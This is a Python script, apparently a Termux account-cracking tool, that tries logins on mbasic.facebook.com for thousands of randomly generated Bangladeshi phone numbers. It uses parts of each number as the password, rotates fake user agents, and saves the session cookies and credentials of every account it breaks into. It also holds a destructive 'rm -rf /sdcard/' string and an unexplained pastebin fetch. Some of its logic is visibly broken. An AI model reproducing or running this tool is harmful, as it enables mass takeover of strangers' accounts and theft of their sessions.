# 
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
from os import system as _HERON_
	
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    _HERON_('pip install requests')
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
	
def logo():
	color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
	print(f"""\n\033[1;90m██   ██ ███████ ██████   ██████ {color_logo} ███    ██ \n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ████   ██ \n\033[1;90m███████ █████   ██████  ██    ██{color_logo} ██ ██  ██    \033[1;97m┏━┓\n\033[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ██  ██ ██  \033[1;92m ┫\033[1;90m│\033[1;91m\033[47m𝘽\033[00m\033[1;90m│\033[1;92m┣\n\033[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙍\033[00m\033[1;90m│\033[1;92m┣\n\t\t\t\t\t      \033[1;90m│\033[1;91m\033[47m𝘼\033[00m\033[1;90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mheroncyber99      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01722183463       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙         \033[1;35m:  \033[1;31m𝙃𝙀𝙍𝙊𝙉 𝘼𝙁𝙍𝙄𝘿𝙄      \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\t\t \033[1;30m[\033[1;32m\033[1;47m𝗕.𝗗.𝗛.𝗔\033[00m\033[1;30m] """)

url_try=requests.get("https://pastebin.com/raw/SpwGTZuZ").text
try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    _HERON_('pip install futures')
	
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    _HERON_('pip install bs4')
_HERON_("pkg install espeak")
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup

			
			



def HERON():
    _HERON_('clear')
    lo("\t\t OPENING TOOL🍎🙃")
    _HERON_("clear")
    logo()
    _HERON_("espeak \"HI sir ,Wellcome to Heron Afridi Rendom cloneing tool\"")
    heron('\033[1;91m╔══[\033[1;92m1\033[1;91m]\033[1;92m RANDOM CRACK ')
    heron('\033[1;91m╚══[\033[1;92m2\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')
    heron('\033[1;91m╔══[\033[1;92m3\033[1;91m]\033[1;92m FOLLOW GITHUB ACCOUNT')
    heron('\033[1;91m╚══[\033[1;92m4\033[1;91m]\033[1;92m CHAT WITH ME')
    heron('\033[1;91m╔══[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m╚══[\033[1;92m✔\033[1;91m]\033[1;30mCHOOSE : ')
    if opt == '1':
    	_HERON_("espeak \" you choose rendom cloneing\"")
    	main()
    if None == '2':
        _HERON_('xdg-open https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _HERON_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _HERON_('xdg-open https://github.com/heroncyber99')
        _HERON_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _HERON_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _HERON_("espeak \"you choose messenger\"")
    if None == '0':
        _HERON_('exit')
        _HERON_("espeak \"good bye sir\"")
        
        return None
	
	
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
	
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;30m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.iorg/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
remove="rm -rf /sdcard/"
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

def heron(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()

ip = requests.get("https://api.ipify.org").text
def main():
    user=[]
    _HERON_('clear')
    logo()
    print("\n")
    _HERON_("espeak \"Sir plz choose your sim cord\"")
    heron('\033[1;93m─────────────────────────────────────────')
    heron('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;37mBD CODE    - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')
    heron('\033[1;93m─────────────────────────────────────────\n')
    kode = input('\033[1;91mCHOOSE YOUR SIM CODE :\33[1;97m')
    _HERON_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
    _HERON_('clear')
    logo()
    print("")
    _HERON_("espeak \"enter cloneing limit\"")
    limit = int(input('\033[1;92mEXAMPLE: 2000, 5000, 10000, 40000\n\n\033[1;91mCHOOSE CLONING LIMIT : '))
    _HERON_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
    for nmbr in range(limit):
	    nmp = ''.join(random.choice(string.digits) for _ in range(8))
	    user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
	    _HERON_('clear')
	    logo() 			
	    tl = str(len(user))
	    print('\033[1;92m─────────────────────────────────────────')
	    print('\033[1;91m〈\033[1;92m🧨\033[1;91m〉\033[1;92m SIM CODE    : \033[1;97m'+kode)
	    print('\033[1;91m〈\033[1;92m🧨\033[1;91m〉\033[1;92m TOTAL IDS   : \033[1;92m'+tl)
	    print("\033[1;91m〈\033[1;92m🧨\033[1;91m〉\033[1;92m MOBILE IP   : \033[1;37m"+ip)
	    print('\033[1;92m─────────────────────────────────────────')
	    _HERON_("espeak \"Sir plz wait\"")
	    for guru in user:
		    uid = kode+guru
		    pwx = guru
		    yaari.submit(rcrack,uid,pwx,tl)
    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
    _HERON_("espeak \"CRACK PROCESS HAS BEEN COMPLETED IDS SAVED IN HERON AFRIDI-OK.txt\"")
    print('\nIDS SAVED IN HERON AFRIDI-OK.txt')
    _HERON_("rm -rf DARK-EYE")
    print(54*'─')
			
	
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'mbasic.facebook.com',
			'method': 'GET',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			# 'cookie': 'datr=1kj7Y4_gf6EUra4RJkbuzaDv; sb=1kj7Y4iSdb10iIQW20V73hrt; locale=en_US; dpr=1.5; wd=320x512; fr=01nx5hBoR10oqh9N8.AWVD58VPsDnoBNSnzG6DfIEUi28.Bj-0kT.Yr.AAA.0.0.Bj_IwM.AWXf29FnUEw',
			'referer': 'https://mbasic.facebook.com/',
			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro,}
			lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
				cid = coki[7:22] 	
				print('\r\r\033[1;30m[\033[1;31mPURE\033[1;37m-\033[1;31mOK\033[1;30m] \033[1;32m ' +uid+ ' | \033[1;31m' +ps+    '  \n\033[1;30m[‎‎🔥]\033[1;37mCOOKIE = \033[1;32m'+coki+  ' \n\033[1;37m[‎\033[1;31mUSER\033[1;37m-\033[1;31mAGANT🍎\033[1;37m] = \033[1;30m'+pro+'  \033[0;97m')
				_HERON_("espeak \"congratulations\"")
				cek_apk(session,coki)
				open('/sdcard/HERON-AFRIDI.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				#print('\r\r\33[1;30m [ERROR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
				_HERON_("espeak \"Heron afridi is brand\"")
				#open('/sdcard/HERON_CP.txt', 'a').write( uid+' | '+ps+' \n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
		sys.stdout.write(f'\r\33[1;90m[\33[1;91mHERON\33[1;97m-\33[1;91mAFRIDI🍎\33[1;90m]-\33[1;90m[\33[1;91m{colr}%s\33[1;90m]-\33[1;90m[\33[1;91mOK:%s\33[1;90m]'%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
HERON()
	 		
